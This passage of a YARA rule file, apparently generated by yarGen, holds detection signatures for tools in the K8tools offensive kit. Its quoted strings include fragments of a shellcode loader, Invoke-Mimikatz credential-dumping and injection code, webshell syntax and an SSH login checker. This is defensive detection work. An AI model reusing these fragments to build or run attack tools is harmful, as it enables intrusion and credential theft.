      $s7 = "http://www.internals.com" fullword wide /* score: '21.00'*/
      $s8 = "\\winio.dll" fullword ascii /* score: '21.00'*/
      $s9 = "***666777333000+++!!!" fullword ascii /* score: '18.00'*/ /* hex encoded string 'fgw30' */
      $s10 = "GETTHEREFAST - " fullword ascii /* score: '17.00'*/
      $s11 = "GETTHEREAMAZINGLYFAST - " fullword ascii /* score: '17.00'*/
      $s12 = "GETTHEREQUICKLY - " fullword ascii /* score: '17.00'*/
      $s13 = "GETTHEREVERYFASTINDEED - " fullword ascii /* score: '17.00'*/
      $s14 = "explorer http://qun.qq.com/air/#35084682/bbs" fullword ascii /* score: '17.00'*/
      $s15 = "?explorer http://crack8.qzone.qq.com/" fullword ascii /* score: '17.00'*/
      $s16 = "666777333000" ascii /* score: '17.00'*/ /* hex encoded string 'fgw30' */
      $s17 = "explorer http://qun.qq.com/air/#35084682/bbs/view/cd/10/td/4" fullword ascii /* score: '17.00'*/
      $s18 = "F:\\testcode\\hknm(1022)\\driver\\helper.cpp" fullword ascii /* score: '16.00'*/
      $s19 = "F:\\testcode\\hknm(1022)\\driver\\dispatch.cpp" fullword ascii /* score: '16.00'*/
      $s20 = "!!!$$$%%%" fullword ascii /* reversed goodware string '%%%$$$!!!' */ /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      ( pe.imphash() == "9165ea3e914e03bda3346f13edbd6ccd" or 8 of them )
}

rule K8PortScan_2 {
   meta:
      description = "K8tools - file K8PortScan.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "8c941f7a9d77ac45492b954d275b223983a8a2f33a88b8a9a0874a511ab6db20"
   strings:
      $s1 = "##python K8PortScan.py -f ip.txt" fullword ascii /* score: '23.00'*/
      $s2 = "##python K8PortScan.py -f ip.txt -p 80-89" fullword ascii /* score: '23.00'*/
      $s3 = "##python K8PortScan.py -f ip24.txt -p 80,445,3306" fullword ascii /* score: '23.00'*/
      $s4 = "##python K8PortScan.py -ip 192.11.22.29 -p 80-89" fullword ascii /* score: '21.00'*/
      $s5 = "##python K8PortScan.py -ip 192.11.22.29/24 -p 80,445,3306" fullword ascii /* score: '21.00'*/
      $s6 = "##Code: https://github.com/k8gege/K8PortScan" fullword ascii /* score: '21.00'*/
      $s7 = "##python K8PortScan.py -ip 192.11.22.29" fullword ascii /* score: '17.00'*/
      $s8 = "# elif ipfile=='ip.txt':" fullword ascii /* score: '15.00'*/
      $s9 = "threading._start_new_thread(GetPortsBanner,(ip,ports,))" fullword ascii /* score: '15.00'*/
      $s10 = "[tmpports.append(i) for i in range(int(ports[0]), int(ports[1]) + 1)]" fullword ascii /* score: '14.00'*/
      $s11 = "parser.add_argument('-f', dest=\"ip_file\", help=\"ip.txt ip24.txt ip16.txt ip8.txt\")" fullword ascii /* score: '14.00'*/
      $s12 = "print 'Help: -h or --help'" fullword ascii /* score: '12.00'*/
      $s13 = "def GetPortsBanner(ip,ports):" fullword ascii /* score: '12.00'*/
      $s14 = "banner=getPortBanner(ip,str(p))" fullword ascii /* score: '12.00'*/
      $s15 = "def getPortBanner(ip, p):" fullword ascii /* score: '12.00'*/
      $s16 = "GetPortsBanner(ip,ports)" fullword ascii /* score: '12.00'*/
      $s17 = "if ipfile=='ip24.txt':" fullword ascii /* score: '11.00'*/
      $s18 = "elif ipfile=='ip8.txt':" fullword ascii /* score: '11.00'*/
      $s19 = "elif ipfile=='ip16.txt':" fullword ascii /* score: '11.00'*/
      $s20 = "##IPlist (ip.txt ip24.txt ip16.txt ip8.txt)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 10KB and
      8 of them
}

rule K8tools_Ladon_2 {
   meta:
      description = "K8tools - file Ladon.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e27c111f2d36c27f41b1dc1690dabee40d27d218d2ba76a6910352bf55da3678"
   strings:
      $s1 = "# test if target is vulnerable" fullword ascii /* score: '27.00'*/
      $s2 = "#python Ladon.py 192.168.1.5/24 -t dll" fullword ascii /* score: '22.00'*/
      $s3 = "#print('Login failed: ' + nt_errors.ERROR_MESSAGES[e.error_code][0])" fullword ascii /* score: '22.00'*/
      $s4 = "conn.login(USERNAME, PASSWORD)" fullword ascii /* score: '22.00'*/
      $s5 = "# print('%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '21.00'*/
      $s6 = "# print('%s\\t%s\\t%s'%(ip,getHostName(ip),SmbVul))" fullword ascii /* score: '21.00'*/
      $s7 = "# output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '21.00'*/
      $s8 = "#Linux not support load 'netscan40.dll' (Maybe Mono is support)" fullword ascii /* score: '20.00'*/
      $s9 = "clr.FindAssembly('netscan40.dll')" fullword ascii /* score: '20.00'*/
      $s10 = "result = socket.gethostbyaddr(target)" fullword ascii /* score: '19.00'*/
      $s11 = "def getHostName(target):" fullword ascii /* score: '19.00'*/
      $s12 = "#python Ladon.py --type=dll 192.11.22.42" fullword ascii /* score: '18.00'*/
      $s13 = "print('%s\\t%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '17.00'*/
      $s14 = "if(os.path.exists('netscan40.dll')):" fullword ascii /* score: '17.00'*/
      $s15 = "if checkPort(target,'445'):" fullword ascii /* score: '17.00'*/
      $s16 = "print('load netscan40.dll')" fullword ascii /* score: '17.00'*/
      $s17 = "#python Ladon.py 192.168.1.5/24 -t ms17010" fullword ascii /* score: '17.00'*/
      $s18 = "output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '17.00'*/
      $s19 = "print('load netscan40.dll (.net >= 4.0)')" fullword ascii /* score: '17.00'*/
      $s20 = "MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB','1.0'))" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 20KB and
      8 of them
}

rule K8_________ASP______________________________ {
   meta:
      description = "K8tools - file K8一句话ASP木马客户端加强程序版.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7b91ca796cadf146a90f642c28d25292ae9f1f5590d55adbe190dec77d5eb1a7"
   strings:
      $s1 = "http://hi.baidu.com/qhack8" fullword wide /* score: '17.00'*/
      $s2 = "/hi.baidu.com/qhacZG6" fullword ascii /* score: '14.00'*/
      $s3 = "<%exec:e(request(\"" fullword ascii /* score: '12.00'*/
      $s4 = "0 VisUC++ R9" fullword ascii /* score: '8.00'*/
      $s5 = "hgjlkbrfzaoe" fullword ascii /* score: '8.00'*/
      $s6 = "Hrsk -#76r" fullword ascii /* score: '8.00'*/
      $s7 = "plbcdfghijklmnpqrs" fullword ascii /* score: '8.00'*/
      $s8 = "tuvwxyzf" fullword ascii /* score: '8.00'*/
      $s9 = "CNotSupporte[" fullword ascii /* score: '7.00'*/
      $s10 = "?%s:%d" fullword ascii /* score: '6.50'*/
      $s11 = "L210%Wr%/.r%Wr-,+Wr%W*)(%Wr%'&q%Wr%$#" fullword ascii /* score: '5.42'*/
      $s12 = "m cannot be run i" fullword ascii /* score: '5.00'*/
      $s13 = "wgFzrd0" fullword ascii /* score: '5.00'*/
      $s14 = "ddress" fullword ascii /* score: '5.00'*/
      $s15 = "N%42%S2H\\pS2%S" fullword ascii /* score: '4.42'*/
      $s16 = "dtxl&p\"< " fullword ascii /* score: '4.42'*/
      $s17 = "DweY}z " fullword ascii /* score: '4.42'*/
      $s18 = "&tP(tK$tFnnnn#tA!t<\"t7Cu" fullword ascii /* score: '4.17'*/
      $s19 = "docum9w [" fullword ascii /* score: '4.00'*/
      $s20 = "DEFAULT_ICON" fullword wide /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      ( pe.imphash() == "e41a3b90c5ecef052470cbe7b0f968d5" or 8 of them )
}

rule _______________ {
   meta:
      description = "K8tools - file 图标提取器.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "8cbdeef4d9e8fa820f173e3e7ed48f5bd20f85f8c8e31e22093cf7fc46a77ed1"
   strings:
      $s1 = "edroptarget" fullword ascii /* score: '20.00'*/
      $s2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Desktop" fullword ascii /* score: '12.00'*/
      $s3 = "Failed to load kernel library!" fullword ascii /* score: '12.00'*/
      $s4 = "Failed to decompress data!" fullword ascii /* score: '10.00'*/
      $s5 = "krnln.fnr" fullword ascii /* score: '10.00'*/
      $s6 = "krnln.fne" fullword ascii /* score: '10.00'*/
      $s7 = "Failed to read file or invalid data in file!" fullword ascii /* score: '10.00'*/
      $s8 = "Failed to read data from the file!" fullword ascii /* score: '10.00'*/
      $s9 = "Not found the kernel library!" fullword ascii /* score: '9.00'*/
      $s10 = "The kernel library is invalid!" fullword ascii /* score: '9.00'*/
      $s11 = "The interface of kernel library is invalid!" fullword ascii /* score: '9.00'*/
      $s12 = "GetNewSock" fullword ascii /* score: '9.00'*/
      $s13 = "* V'?>)" fullword ascii /* score: '9.00'*/
      $s14 = "Can't retrieve the temporary directory!" fullword ascii /* score: '7.01'*/
      $s15 = "?8`Q:\"" fullword ascii /* score: '7.00'*/
      $s16 = "PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii /* score: '6.50'*/
      $s17 = "{9DA96BF9CEBD45c5BFCF94CBE61671F5}" fullword ascii /* score: '6.00'*/
      $s18 = "9DA96BF9CEBD45c5BFCF94CBE61671F5" ascii /* score: '6.00'*/
      $s19 = "Wjbieyi" fullword ascii /* score: '6.00'*/
      $s20 = ".*9c* " fullword ascii /* score: '5.42'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      ( pe.imphash() == "9165ea3e914e03bda3346f13edbd6ccd" or 8 of them )
}

rule NV____________NVexploit {
   meta:
      description = "K8tools - file NV显卡提权NVexploit.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0d53a3d9cf6812cbaebc30cbe1246ba67a50f2d0728639b00a534162ecfd3ea2"
   strings:
      $s1 = "exp.exe" fullword ascii /* score: '19.00'*/
      $s2 = "NVexploit\\NVExploit.cpp" fullword ascii /* score: '11.42'*/
      $s3 = "NVexploit\\exp.rar" fullword ascii /* score: '11.42'*/
      $s4 = "NVexploit" fullword ascii /* score: '8.00'*/
      $s5 = "EZHk$ d" fullword ascii /* score: '4.00'*/
      $s6 = "|'uR&h " fullword ascii /* score: '1.42'*/
      $s7 = "*>W6t " fullword ascii /* score: '1.42'*/
      $s8 = ";^rGR]9" fullword ascii /* score: '1.00'*/
      $s9 = "|:B@t?" fullword ascii /* score: '1.00'*/
      $s10 = "eEx_g(" fullword ascii /* score: '1.00'*/
      $s11 = "w^y=b{D" fullword ascii /* score: '1.00'*/
      $s12 = "<I`oOju" fullword ascii /* score: '1.00'*/
      $s13 = "mF_p>*" fullword ascii /* score: '1.00'*/
      $s14 = "U(g31p" fullword ascii /* score: '1.00'*/
      $s15 = "lX'Savc" fullword ascii /* score: '1.00'*/
      $s16 = ")=#&~G" fullword ascii /* score: '1.00'*/
      $s17 = "/M}3pV" fullword ascii /* score: '1.00'*/
      $s18 = "HS8A1l" fullword ascii /* score: '1.00'*/
      $s19 = "TcV/.(B" fullword ascii /* score: '1.00'*/
      $s20 = "-^8Il8" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 60KB and
      8 of them
}

rule K8tools_sshtest_2 {
   meta:
      description = "K8tools - file sshtest.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "09529e072615a89b43e6f862aec84d78411d604a67ac832eb9e3c999b22d0a57"
   strings:
      $x1 = "# C:\\Users\\null\\Desktop\\ssh>python ssh.py 192.11.22.60 22 root k8gege" fullword ascii /* score: '33.00'*/
      $s2 = "# 192.11.22.60 22 root k8gege LoginOK" fullword ascii /* score: '24.00'*/
      $s3 = "print sys.argv[1]+' '+sys.argv[2]+' '+sys.argv[3]+' '+sys.argv[4]+' LoginOK'" fullword ascii /* score: '15.00'*/
      $s4 = "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())" fullword ascii /* score: '15.00'*/
      $s5 = "import paramiko" fullword ascii /* score: '9.00'*/
      $s6 = "ssh.connect(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])" fullword ascii /* score: '7.00'*/
      $s7 = "ssh = paramiko.SSHClient()" fullword ascii /* score: '4.17'*/
      $s8 = "checkSSH()" fullword ascii /* score: '4.00'*/
      $s9 = "def checkSSH():" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule K8ARPTool {
   meta:
      description = "K8tools - file K8ARPTool.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "55996c37d4c77f814201191bc9246738ceb377381f1333a88a6ff0d14deecf21"
   strings:
      $s1 = "K8ARPTools\\K8ArpGetShell.batQl" fullword ascii /* score: '18.42'*/
      $s2 = "K8ARPTools\\Interop.DFSSHLEXLib.dllQl" fullword ascii /* score: '13.42'*/
      $s3 = "K8ARPTools\\PacketDotNet.dllQl" fullword ascii /* score: '13.42'*/
      $s4 = "K8ARPTools\\K8DnsSpoofing.batQl" fullword ascii /* score: '13.42'*/
      $s5 = "K8ARPTools\\SharpPcap.dllQl" fullword ascii /* score: '9.42'*/
      $s6 = "\"2>,}*1\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s7 = "K8ARPTools\\K8ARPtools.exeQl" fullword ascii /* score: '8.42'*/
      $s8 = "K8ARPTools\\K8ArpExp.exeQl" fullword ascii /* score: '8.42'*/
      $s9 = "K8ARPTools\\K8AspServer.exeQl" fullword ascii /* score: '8.42'*/
      $s10 = "K8ARPTools\\K8url.txtQl" fullword ascii /* score: '8.42'*/
      $s11 = "K8ARPTools\\config.xmlQl" fullword ascii /* score: '7.42'*/
      $s12 = "Agzpygb" fullword ascii /* score: '6.00'*/
      $s13 = "GOH6[ -" fullword ascii /* score: '5.00'*/
      $s14 = "- z]@Z" fullword ascii /* score: '5.00'*/
      $s15 = "RF -?Dx" fullword ascii /* score: '5.00'*/
      $s16 = "xJfWaD12" fullword ascii /* score: '5.00'*/
      $s17 = "V%T%0\"so" fullword ascii /* score: '5.00'*/
      $s18 = "ivMGou4" fullword ascii /* score: '5.00'*/
      $s19 = ";[edxf\"i}#" fullword ascii /* score: '4.42'*/
      $s20 = "K8ARPTools\\k8arp.htmQl" fullword ascii /* score: '4.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8_Ecshop_Exploit_2013_02_22_K8_ {
   meta:
      description = "K8tools - file K8_Ecshop_Exploit_2013_02_22[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6b124f7b282e95e5c2450f714362582e5e7907882f22188a02be29589664948a"
   strings:
      $s1 = "K8_Ecshop_Exploit.exe" fullword ascii /* score: '23.00'*/
      $s2 = "txFXs2" fullword ascii /* score: '2.00'*/
      $s3 = "S]~#\\gnZ7Enq" fullword ascii /* score: '1.42'*/
      $s4 = "+V\\HE\"XXs" fullword ascii /* score: '1.17'*/
      $s5 = "8a5'}-" fullword ascii /* score: '1.00'*/
      $s6 = "FWqp(r" fullword ascii /* score: '1.00'*/
      $s7 = "R|PrgC" fullword ascii /* score: '1.00'*/
      $s8 = "8&$/,a" fullword ascii /* score: '1.00'*/
      $s9 = "r93W~Ld" fullword ascii /* score: '1.00'*/
      $s10 = "1-//REv" fullword ascii /* score: '1.00'*/
      $s11 = "}'O_BW-" fullword ascii /* score: '1.00'*/
      $s12 = "l#P8m!" fullword ascii /* score: '1.00'*/
      $s13 = "2*Bk/{" fullword ascii /* score: '1.00'*/
      $s14 = "FQN{.O" fullword ascii /* score: '1.00'*/
      $s15 = "q<):_WhZ" fullword ascii /* score: '1.00'*/
      $s16 = "4}duDG" fullword ascii /* score: '1.00'*/
      $s17 = "]e]W9uWY_" fullword ascii /* score: '1.00'*/
      $s18 = "%\\z7?+" fullword ascii /* score: '1.00'*/
      $s19 = "x<_5~B" fullword ascii /* score: '1.00'*/
      $s20 = "dN_xw(" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 40KB and
      8 of them
}

rule Jboss_invoke_Exp_k8 {
   meta:
      description = "K8tools - file Jboss_invoke_Exp_k8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ed28a23b1e959140eb88114ff39c108e02e47b783d43b96ebb00b6d07cc7fa35"
   strings:
      $s1 = "B* ch%" fullword ascii /* score: '5.00'*/
      $s2 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K85.rb" fullword ascii /* score: '4.42'*/
      $s3 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K80.rb" fullword ascii /* score: '4.42'*/
      $s4 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K83.rb" fullword ascii /* score: '4.42'*/
      $s5 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K81.rb" fullword ascii /* score: '4.42'*/
      $s6 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K84.rb" fullword ascii /* score: '4.42'*/
      $s7 = "Jboss_invoke_Exp_k8\\jboss_invoke_deploy_K82.rb" fullword ascii /* score: '4.42'*/
      $s8 = "Jboss_invoke_Exp_k8\\jboss_maindeployer.rb" fullword ascii /* score: '4.42'*/
      $s9 = "Jboss_invoke_Exp_k8" fullword ascii /* score: '4.00'*/
      $s10 = "Jboss_invoke_Exp_k8\\" fullword ascii /* score: '4.00'*/
      $s11 = "QvEoA0" fullword ascii /* score: '2.00'*/
      $s12 = "*RtIc " fullword ascii /* score: '1.42'*/
      $s13 = "%!l=@UP" fullword ascii /* score: '1.00'*/
      $s14 = "K]N^FF" fullword ascii /* score: '1.00'*/
      $s15 = "Fo<E:C" fullword ascii /* score: '1.00'*/
      $s16 = "T%Gq2" fullword ascii /* score: '1.00'*/
      $s17 = "QK!V)&!" fullword ascii /* score: '1.00'*/
      $s18 = "A>D&]NC" fullword ascii /* score: '1.00'*/
      $s19 = "FToDcx" fullword ascii /* score: '1.00'*/
      $s20 = "587La,'a" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 80KB and
      8 of them
}

rule Invoke_Mimikatz {
   meta:
      description = "K8tools - file Invoke-Mimikatz.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "cbf1cc4a73f9b8b37e9671dce09c7c09a237f7dae6a095f42d9a90a8c94866bc"
   strings:
      $x1 = "$PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm" ascii /* score: '68.00'*/
      $x2 = "$PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm" ascii /* score: '60.00'*/
      $x3 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x4 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x5 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x6 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x7 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x8 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x9 = "http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/" fullword ascii /* score: '36.00'*/
      $x10 = "#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory" fullword ascii /* score: '34.00'*/
      $x11 = "#If a remote process to inject in to is specified, get a handle to it" fullword ascii /* score: '34.00'*/
      $x12 = "Execute mimikatz on two remote computers to dump credentials." fullword ascii /* score: '33.00'*/
      $x13 = "Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection" fullword ascii /* score: '32.00'*/
      $x14 = "$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.17'*/
      $x15 = "$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.17'*/
      $x16 = "Find mimikatz at: http://blog.gentilkiwi.com" fullword ascii /* score: '30.00'*/
      $s17 = "#Write Shellcode to the remote process which will call GetProcAddress" fullword ascii /* score: '30.00'*/
      $s18 = "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword ascii /* score: '29.00'*/
      $s19 = "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerNam" ascii /* score: '29.00'*/
      $s20 = "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerNam" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule ScRunBase32_2 {
   meta:
      description = "K8tools - file ScRunBase32.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "9982d8a1885bcf5cd0ec01a0a3fec4434c09ea1bfc8d5508441b4aac46d33977"
   strings:
      $s1 = "ctypes.c_int(len(shellcode))," fullword ascii /* score: '18.00'*/
      $s2 = "ctypes.c_int(len(shellcode)))" fullword ascii /* score: '18.00'*/
      $s3 = "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)" fullword ascii /* score: '18.00'*/
      $s4 = "shellcode=bytearray(base64.b32decode(sys.argv[1]).decode(\"hex\"))" fullword ascii /* score: '18.00'*/
      $s5 = "TGUZTQMBSIU2TARKFHEZUMNBSIIZTIMJRIU4TQQSCIY4DCQZZGJATCMZVG44TSMRQIQ4DCM2DGUZDIRCGIYYDORBVGA2TIRRXGUYUIMJSIVCEGNZVIJAUMNJXIQZEMNR" ascii /* score: '15.00'*/
      $s6 = "ZIRDDKNBRIIYTMNKGGJDDCRKFHAYTIOBVGIYTGOBYGQ4TENSBIEYECRKGIQ2ECRBRGYZTCRKCGY4TQMBYIQ2TIQZRIJCDSMRXIFBTEQJSGVCUEOJTHAZUCOCGGVCDIMR" ascii /* score: '15.00'*/
      $s7 = "#calc.exe" fullword ascii /* score: '15.00'*/
      $s8 = "CIRBEMNJXIM4TSRBXG5CUIMBQHE3DGRRSIZCDGRKDGRBDSRCCG4YUINJQIZCTIRCEGE2TCMJZHAYUMNCBIYYUCMKEGA4UMRRQIU3DAQZWIZATAQSGGVBEGMRVGVBUEMJ" ascii /* score: '15.00'*/
      $s9 = "#IRBEGM2EHE3TIMRUIY2EERKFHA2UCMRXGEZTKRRTGFBTSQRRGMZTGMJXG4YTOOBTIM3TANBQGM4UMNBZIM2UKNSBGM4DMOBQGA4TKQRVG5DDGOBQIJCTMNRSGFDDMQ2" ascii /* score: '14.00'*/
      $s10 = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr)," fullword ascii /* score: '12.00'*/
      $s11 = "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0)," fullword ascii /* score: '12.00'*/
      $s12 = "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))" fullword ascii /* score: '12.00'*/
      $s13 = "WGVBDQMJSIZBUKMBUGI3TGQSGIM2TCNJRGY3DMQKBG5CDGMKDIQZUCN2FIIYUKNZTIMYEIQJZGUYUGOJXIUZDORRVHE3DOQJZGIZEGQSFGA3TIQRXGRCTMRBYG43EIOC" ascii /* score: '10.00'*/
      $s14 = "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)," fullword ascii /* score: '9.00'*/
      $s15 = "ctypes.pointer(ctypes.c_int(0)))" fullword ascii /* score: '7.00'*/
      $s16 = "#scrun by k8gege" fullword ascii /* score: '7.00'*/
      $s17 = "ctypes.c_int(ptr)," fullword ascii /* score: '4.00'*/
      $s18 = "ctypes.c_int(0)," fullword ascii /* score: '4.00'*/
      $s19 = "ctypes.c_int(0x3000)," fullword ascii /* score: '4.00'*/
      $s20 = "ctypes.c_int(0x40))" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7323 and filesize < 5KB and
      8 of them
}

rule commit_msg {
   meta:
      description = "K8tools - file commit-msg.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f74d5e9292979b573ebd59741d46cb93ff391acdd083d340b94370753d92437"
   strings:
      $s1 = "# An example hook script to check the commit log message." fullword ascii /* score: '22.00'*/
      $s2 = "# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')" fullword ascii /* score: '19.00'*/
      $s3 = "# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"" fullword ascii /* score: '12.00'*/
      $s4 = "sort | uniq -c | sed -e '/^[ " fullword ascii /* score: '12.00'*/
      $s5 = "# Uncomment the below to add a Signed-off-by line to the message." fullword ascii /* score: '11.00'*/
      $s6 = "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg" fullword ascii /* score: '11.00'*/
      $s7 = "# To enable this hook, rename this file to \"commit-msg\"." fullword ascii /* score: '11.00'*/
      $s8 = "# commit.  The hook is allowed to edit the commit message file." fullword ascii /* score: '11.00'*/
      $s9 = "# that has the commit message.  The hook should exit with non-zero" fullword ascii /* score: '11.00'*/
      $s10 = "# hook is more suited to it." fullword ascii /* score: '8.00'*/
      $s11 = "# status after issuing an appropriate message if it wants to stop the" fullword ascii /* score: '8.00'*/
      $s12 = "# Called by \"git commit\" with one argument, the name of the file" fullword ascii /* score: '7.00'*/
      $s13 = "test \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |" fullword ascii /* score: '4.00'*/
      $s14 = "# This example catches duplicate Signed-off-by lines." fullword ascii /* score: '4.00'*/
      $s15 = "]/d')\" || {" fullword ascii /* score: '1.00'*/
      $s16 = "echo >&2 Duplicate Signed-off-by lines." fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule K8_JbossExp {
   meta:
      description = "K8tools - file K8_JbossExp.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4536d7d187e1dfe67ec0b568af318d63d88a1828be07900138b438d7cd4dea51"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "QwOLgZ1OZixjLErMj8.EDtEGKY7QEo0e38mZq+Q2TxoUUmQmAdNCJkus+OKQo7KJqEsqhrmrCfZ`1[[System.Object, mscorlib, Version=2.0.0.0, Culture" ascii /* score: '27.00'*/
      $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s6 = "ributes, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "ersion=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=2.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s8 = "K8_JbossExp.exe" fullword wide /* score: '19.00'*/
